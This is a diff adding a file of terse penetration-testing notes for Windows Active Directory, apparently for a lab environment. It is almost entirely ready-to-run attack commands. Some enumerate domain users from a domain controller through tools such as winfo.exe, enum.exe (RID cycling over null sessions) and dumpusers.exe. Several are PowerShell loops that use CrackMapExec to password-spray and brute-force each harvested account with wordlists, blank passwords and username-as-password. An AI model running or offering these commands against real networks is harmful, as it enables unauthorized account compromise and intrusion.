@@ -1,0 +1,88 @@
+
+####################################
+ .\winfo.exe 
+####################################
+This is a bit buggy dont spam it 
+
+.\winfo.exe <DC IP>
+ 
+copy thr users into notepad++
+Edit > Line Operators > Remove Empty Lines 
+find and replace ' * '  with noththing 
+ 
+can get local users too 
+
+.\winfo.exe 127.0.0.1
+
+
+
+
+
+####################################
+enum
+####################################
+
+# powershell Get list of users 
+
+.\get-users_enum.ps1 [IP ADDRESS]
+
+
+
+# RID Cycle - NULL Sessions. Get Users
+
+$(.\enum.exe -U 172.16.0.10 | Select-String -NotMatch -Pattern "server: ", "setting up session", "getting user list", "cleaning up") -Split " " | Where { $_.Replac
+e(";","")}
+
+
+
+
+
+####################################
+dumpusers
+####################################
+
+.\get-users_dumpusers.ps1 [IP ADDRESS]
+
+.\dumpusers.exe -target 192.168.80.50 -type dc -start 300 -stop 2000 -mode verbose
+
+$(.\dumpusers.exe -target 192.168.80.50 -type dc -start 300 -stop 2000 -mode verbose) -Split '\\' | findstr /v "Account name" | findstr /v '\$' | Select-String -NotMatch " " | Tee users.txt
+
+
+
+
+
+
+
+
+
+
+####################################
+CrackMapExecWin
+#####################################
+
+set the target variable
+
+$global:target="192.168.80.50"
+
+# password 
+ForEach ($user in Get-Content users.txt) {.\crackmapexec.exe -u $user -p password $target | tee -append brute_cme.log};Get-Content .\brute_cme.log | findstr [+] | sort-object| Get-Unique | tee cme_brute_cracked.txt
+
+
+# pass5.txt
+ForEach ($user in Get-Content users.txt) {.\crackmapexec.exe -u $user -p pass5.txt $target | tee -append brute_cme.log};Get-Content .\brute_cme.log | findstr [+] | sort-object| Get-Unique | tee cme_brute_cracked.txt
+
+# user = password
+ForEach ($user in Get-Content users.txt) {.\crackmapexec.exe -u $user -p $user $target | tee -append brute_cme.log};Get-Content .\brute_cme.log | findstr [+] | sort-object| Get-Unique | tee cme_brute_cracked.txt
+
+# pass_blank.txt
+ForEach ($user in Get-Content users.txt) {.\crackmapexec.exe -u $user -p pass_blank.txt $target | tee -append brute_cme.log};Get-Content .\brute_cme.log | findstr [+] | sort-object| Get-Unique | tee cme_brute_cracked.txt
+
+# pass10.txt
+ForEach ($user in Get-Content users.txt) {.\crackmapexec.exe -u $user -p pass10.txt $target | tee -append brute_cme.log};Get-Content .\brute_cme.log | findstr [+] | sort-object| Get-Unique | tee cme_brute_cracked.txt
+
+# pass100.txt
+ForEach ($user in Get-Content users.txt) {.\crackmapexec.exe -u $user -p pass100.txt $target | tee -append brute_cme.log};Get-Content .\brute_cme.log | findstr [+] | sort-object| Get-Unique | tee cme_brute_cracked.txt
+
+
+Get-Content .\cme_brute_cracked.txt
+
